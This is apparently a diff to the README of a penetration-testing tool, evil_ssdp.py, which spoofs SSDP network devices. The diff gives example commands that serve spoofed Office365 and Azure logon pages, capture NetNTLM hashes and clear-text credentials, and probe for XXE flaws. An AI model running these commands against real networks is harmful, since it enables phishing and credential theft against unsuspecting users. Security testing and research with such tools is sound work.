@@ -14,7 +14,7 @@ As a bonus, this tool can also detect and exploit potential zero-day vulnerabili
 The most basic run looks like this:
 
 ```
-essdp.py eth0
+evil_ssdp.py eth0
 ```
 
 You need to provide the network interface at a minimum. The interface is used for both the UDP SSDP interaction as well as hosting a web server for the XML files and phishing page.
@@ -26,23 +26,24 @@ Some example scenarios:
 ```
 # Use wlan0 for device advertisement and phishing, capturing NetNTLM and asking for clear-text
 # via a spoofed Office365 logon form. Redirect to Microsoft aftering capturing credentials:
-essdp.py wlan0 -t office365 -u 'https://office.microsoft.com'
+evil_ssdp.py wlan0 -t office365 -u 'https://office.microsoft.com'
 
 # Same as above, but assuming your SMB server is running on another IP:
-essdp.py wlan0 -t office365 -u 'https://office.microsoft.com' -s 192.168.1.205
+evil_ssdp.py wlan0 -t office365 -u 'https://office.microsoft.com' -s 192.168.1.205
 
 # Prompt for creds using basic auth and redirect to Azure:
-essdp.py wlan0 -t microsoft-azure -u 'https://azure.microsoft.com/auth/signin/' -b
+evil_ssdp.py wlan0 -t microsoft-azure -u 'https://azure.microsoft.com/auth/signin/' -b
 
 # Hope for an XXE vul to capture NetNTLM while Impacket/Responder is running on wlan0:
-essdp.py wlan0 -t xxe-smb
+evil_ssdp.py wlan0 -t xxe-smb
 ```
 
 Full usage details:
 
 ```
-usage: essdp.py [-h] [-p PORT] [-t TEMPLATE] [-s SMB] [-b] [-r REALM] [-u URL]
-                interface
+usage: evil_ssdp.py [-h] [-p PORT] [-t TEMPLATE] [-s SMB] [-b] [-r REALM]
+                    [-u URL]
+                    interface
 
 positional arguments:
   interface             Network interface to listen on.
@@ -52,19 +53,19 @@ optional arguments:
   -p PORT, --port PORT  Port for HTTP server. Defaults to 8888.
   -t TEMPLATE, --template TEMPLATE
                         Name of a folder in the templates directory. Defaults
-                        to "office365". This will determine xml and
-                        phishing pages used.
+                        to "office365". This will determine xml and phishing
+                        pages used.
   -s SMB, --smb SMB     IP address of your SMB server. Defalts to the primary
                         address of the "interface" provided.
   -b, --basic           Enable base64 authentication for templates and write
                         credentials to creds.txt
   -r REALM, --realm REALM
-                        Realm to appear when prompting users for
-                        authentication via base64 auth.
-  -u URL, --url URL     Redirect to this URL (ex: '-u http://google.com').
-                        Works with templates that do a POST for logon forms
-                        and with templates including the custom redirect
-                        JavaScript (see README for more info).
+                        Realm when prompting target for authentication via
+                        Basic Auth.
+  -u URL, --url URL     Redirect to this URL. Works with templates that do a
+                        POST for logon forms and with templates that include
+                        the custom redirect JavaScript (see README for more
+                        info).[example: -r https://google.com]
 ```
 
 # Templates
